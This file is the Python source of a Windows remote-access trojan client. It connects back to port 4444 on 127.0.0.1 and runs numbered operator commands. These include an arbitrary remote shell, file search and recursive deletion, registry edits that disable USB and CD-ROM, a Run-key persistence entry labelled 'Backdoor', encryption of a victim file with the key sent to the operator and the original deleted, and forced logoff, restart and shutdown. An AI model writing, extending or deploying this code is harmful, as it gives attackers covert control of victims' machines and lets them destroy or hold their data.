from socket import *
import subprocess as sub
from winreg import *
import pyttsx3
from cryptography.fernet import Fernet
import copy

s = socket(2,1)
s.connect(("127.0.0.1",4444))
print("Connected To Port")
print("______________________________")

def choice(data):
    
    if data == "1":
        while True:
            data1 = s.recv(102456).decode()
            cmd = sub.check_output(data1, shell=True).decode()
            s.send(str(cmd).encode())


    elif data == "2":
        
        drive = ["A:","B:","C:","D:","E:","F:","G:","H:","Z:","N:"]
        sys_drive=[]
        cmd = sub.check_output("net share", shell=True).decode()
        for i in drive:
            if i in str(cmd):
                sys_drive.append(i)
        s.send(str(sys_drive).encode())


    elif data[0] == "3":
        
        drive = ["A:","B:","C:","D:","E:","F:","G:","H:","Z:","N:"]
        sys_drive=[]
        cmd = sub.check_output("net share", shell=True).decode()
        for i in drive:
            if i in str(cmd):
                sys_drive.append(i)

        for i in sys_drive:
            try:
                cmd_2 = sub.check_output("dir/ S/ B "+i+"\\"+data[1:], shell=True).decode()
                s.send(str(cmd_2).encode())
            except:
                s.send("Not found".encode())


    elif data[0] == "4":

        drive = ["A:","B:","C:","D:","E:","F:","G:","H:","Z:","N:"]
        sys_drive=[]
        cmd = sub.check_output("net share", shell=True).decode()
        for i in drive:
            if i in str(cmd):
                sys_drive.append(i)

        for i in sys_drive:
            try:
                sub.check_output("del /S "+i+"\\"+data[1:], shell=True)
                s.send("Win".encode())
            except:
                s.send("Lose".encode())


    elif data == "5":

            keyVal = r'SYSTEM\CurrentControlSet\Services\cdrom'
            try:
                key = OpenKey(HKEY_LOCAL_MACHINE,keyVal,0,KEY_ALL_ACCESS)
            except:
                key = CreateKey(HKEY_LOCAL_MACHINE,keyVal)

            try:    
                SetValueEx(key,"start",0,REG_DWORD,4)
                CloseKey(key)
                s.send("Disabled CDROM".encode())
            except:
                s.send("Icant Disabled CDROM(maybe shoud run as administartor)".encode())


    elif data == "6":

            keyVal = r'SYSTEM\CurrentControlSet\Services\USBSTOR'
            try:
                key = OpenKey(HKEY_LOCAL_MACHINE,keyVal,0,KEY_ALL_ACCESS)
            except:
                key = CreateKey(HKEY_LOCAL_MACHINE,keyVal)

            try:    
                SetValueEx(key,"start",0,REG_DWORD,4)
                CloseKey(key)
                s.send("Disabled USB".encode())
            except:
                s.send("Icant Disabled USB(maybe shoud run as administartor)".encode())


    elif data == "7":
        
        keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
        try:
            key = OpenKey(HKEY_CURRENT_USER,keyVal,0,KEY_ALL_ACCESS)
        except:
            key = CreateKey(HKEY_CURRENT_USER,keyVal)

        try:
            SetValueEx(key,"notepad",0,REG_SZ,"C:\\Windows\\System32\\Notepad.exe")
            CloseKey(key)
            s.send("Backdoor is Working".encode())
        except:
            s.send("Backdoor is not Working(maybe shoud run as administartor OR ....)")


    elif data[0] == "8":

        Warning = """
        MsgBox (" """+data[1:]+""" ")
        """
        try:
            f = open("C:\\Windows\\hack.vbs","w")
            for i in range(10):
                f.writelines(Warning)
            f.close()
            sub.check_output("C:\\Windows\\hack.vbs",shell=True)
            s.send("OK".encode())
        except:
            s.send("Dont OK".encode())


    elif data[0] == "9":

        try:
            for i in range(1):
                e = pyttsx3.init()
                e.setProperty("rate",110)
                e.say(str(data[1:]))
                e.runAndWait()
            s.send("Passed".encode())
        except:
            s.send("Failed".encode())


    elif data[0:2] == "10":

        key = Fernet.generate_key()
        s.send(key)

        F = copy.copy(data[2:])
        
        File = open(data[2:], 'rb')
        data=File.read()
        File.close()
        
        sub.check_output("del "+F, shell=True)

        File_2 = open(b'hacker_enc.jpg','wb')

        F = Fernet(key)
        ENC = F.encrypt(data)
        File_2.write(ENC)
        File_2.close()


    elif data[0:2] == "11":
        key = s.recv(1024).decode()
        File = open(data[2:], 'rb')
        data = File.read()
        File.close()

        File_2 = open(b'hacker_dec.jpg', 'wb')

        F = Fernet(key)
        dec = F.decrypt(data)
        File_2.write(dec)
        File_2.close()
        

    elif data == "12":
            sub.check_output("SHUTDOWN /l", shell=True)


    elif data == "13":
            sub.check_output("SHUTDOWN /r", shell=True)


    elif data == "14":
            sub.check_output("SHUTDOWN /s", shell=True)
        



data = s.recv(1024).decode()
choice(data)
    


